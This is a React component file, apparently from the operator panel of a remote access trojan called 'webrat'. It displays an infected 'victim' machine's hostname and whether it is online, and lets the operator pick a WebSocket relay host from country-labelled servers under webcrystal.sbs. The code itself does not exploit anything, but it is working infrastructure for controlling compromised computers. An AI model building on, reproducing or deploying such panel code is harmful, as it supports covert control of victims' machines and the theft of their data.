"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { createPortal } from "react-dom";

import type { Victim } from "../../api/victims";

import { isVictimOnline } from "../utils/victim-status";
import { readWsHostGlobal, writeWsHostGlobal } from "../../settings/storage";

function getStatus(victim: Victim | null): "waiting" | "connected" | "disconnected" {
   if (!victim) return "waiting";

   const online = isVictimOnline(victim);
   return online ? "connected" : "disconnected";
}

export function DetailStatusCard(props: { victim: Victim | null }) {
   const { victim } = props;
   const status = getStatus(victim);

   const btnRef = useRef<HTMLButtonElement | null>(null);
   const menuRef = useRef<HTMLDivElement | null>(null);

   const [wsOpen, setWsOpen] = useState(false);
   const [wsValue, setWsValue] = useState<string>("__default__");
   const [wsMenuPos, setWsMenuPos] = useState<{ left: number; top: number; width: number } | null>(null);

   useEffect(() => {
      const readValue = () => {
         const v = readWsHostGlobal();
         setWsValue(v ? v : "__default__");
      };
      readValue();

      const onHost = () => readValue();
      try {
         window.addEventListener("webrat_ws_host_changed", onHost as EventListener);
      } catch {
         return;
      }
      return () => {
         try {
            window.removeEventListener("webrat_ws_host_changed", onHost as EventListener);
         } catch {
         }
      };
   }, []);

   const wsLabel = useMemo(() => {
      const v = String(wsValue || "").trim();
      if (v === "__default__" || v === "") return "Default";
      if (v === "ru.webcrystal.sbs") return "Russia";
      if (v === "kz.webcrystal.sbs") return "Kazakhstan";
      if (v === "ua.webcrystal.sbs") return "Ukraine";
      return v;
   }, [wsValue]);

   useEffect(() => {
      if (!wsOpen) return;

      const onDoc = (e: MouseEvent) => {
         const t = e.target as Node | null;
         if (!t) return;

         const btn = btnRef.current;
         const menu = menuRef.current;
         if (btn && btn.contains(t)) return;
         if (menu && menu.contains(t)) return;
         setWsOpen(false);
      };

      document.addEventListener("mousedown", onDoc);
      return () => {
         document.removeEventListener("mousedown", onDoc);
      };
   }, [wsOpen]);

   const lineColor =
      status === "connected" ? "bg-[#4caf50]" : status === "disconnected" ? "bg-[#f44336]" : "bg-[#888]";

   const label = status === "connected" ? "Connected" : status === "disconnected" ? "Disconnected" : "Waiting for user";

   return (
      <div
         className={
            "mt-auto rounded-[14px] border border-[rgba(120,120,120,0.7)] bg-[rgba(32,32,36,0.9)] px-[8px] pb-[18px] pt-[12px] text-center " +
            "text-[15px] font-semibold text-[rgba(235,235,235,0.97)]"
         }
      >
         <div className="mb-[8px] text-[15px] font-semibold text-[rgba(235,235,235,0.95)]" id="detailStatusPc">
            {victim?.hostname ?? "-"}
         </div>
         <div className="mb-[8px] h-[2px] w-full bg-[var(--line)]" />
         <div className="mb-[4px]" id="detailStatusLabel">
            {label}
         </div>
         <div className={"mx-auto h-[3px] w-[85%] rounded-full opacity-85 animate-pulse " + lineColor} />

         <div className="mt-[10px] grid gap-[8px]">
            <button
               id="detailWsSettingsBtn"
               type="button"
               ref={btnRef}
               className={
                  "flex h-[34px] w-full items-center justify-center gap-[8px] rounded-[12px] border border-[rgba(150,150,150,0.3)] " +
                  "bg-[linear-gradient(180deg,rgba(38,38,46,0.92),rgba(18,18,24,0.92))] text-[rgba(240,240,240,0.92)] font-[650] " +
                  "transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:border-[rgba(220,220,220,0.45)] hover:shadow-[0_10px_22px_rgba(0,0,0,0.45)] active:translate-y-[1px]"
               }
               onClick={() => {
                  const willOpen = !wsOpen;
                  setWsOpen(willOpen);
                  if (!willOpen) {
                     setWsMenuPos(null);
                     return;
                  }
                  const btn = btnRef.current;
                  if (!btn) {
                     setWsMenuPos(null);
                     return;
                  }
                  try {
                     const rect = btn.getBoundingClientRect();
                     setWsMenuPos({ left: rect.left, top: rect.bottom + 8, width: rect.width });
                  } catch {
                     setWsMenuPos(null);
                  }
               }}
            >
               <span>Settings</span>
               <span
                  id="detailWsSettingsValue"
                  className="inline-flex items-center justify-center rounded-full border border-white/[0.14] bg-black/25 px-[8px] py-[2px] text-[12px] font-bold tracking-[0.02em]"
               >
                  {wsLabel}
               </span>
            </button>

            {wsOpen && wsMenuPos
               ? createPortal(
                  <div
                     ref={menuRef}
                     className="fixed z-[9999] rounded-[14px] border border-white/[0.14] bg-[rgba(12,12,12,0.96)] p-[8px] text-white shadow-[0_22px_54px_rgba(0,0,0,0.65)]"
                     style={{ left: wsMenuPos.left, top: wsMenuPos.top, width: wsMenuPos.width }}
                     role="listbox"
                  >
                     {[
                        { value: "__default__", label: "Default" },
                        { value: "ru.webcrystal.sbs", label: "Russia" },
                        { value: "kz.webcrystal.sbs", label: "Kazakhstan" },
                        { value: "ua.webcrystal.sbs", label: "Ukraine" },
                     ].map((opt) => {
                        const selected = wsValue === opt.value;
                        return (
                           <button
                              key={opt.value}
                              type="button"
                              className={
                                 "w-full text-left px-[10px] py-[10px] rounded-[12px] text-[13px] leading-[1.15] font-semibold text-white transition-[background,transform] cursor-pointer " +
                                 (selected
                                    ? "bg-[rgba(80,230,255,0.12)] border border-[rgba(80,230,255,0.20)]"
                                    : "bg-transparent hover:bg-white/[0.08]")
                              }
                              onClick={() => {
                                 setWsValue(opt.value);
                                 writeWsHostGlobal(opt.value);
                                 setWsOpen(false);
                              }}
                              role="option"
                              aria-selected={selected}
                           >
                              {opt.label}
                           </button>
                        );
                     })}
                  </div>,
                  document.body,
               )
               : null}

            <select id="detailWsServerSelect" className="hidden">
               <option value="__default__">Default</option>
               <option value="ru.webcrystal.sbs">Russia</option>
               <option value="kz.webcrystal.sbs">Kazakhstan</option>
               <option value="ua.webcrystal.sbs">Ukraine</option>
            </select>
         </div>
      </div>
   );
}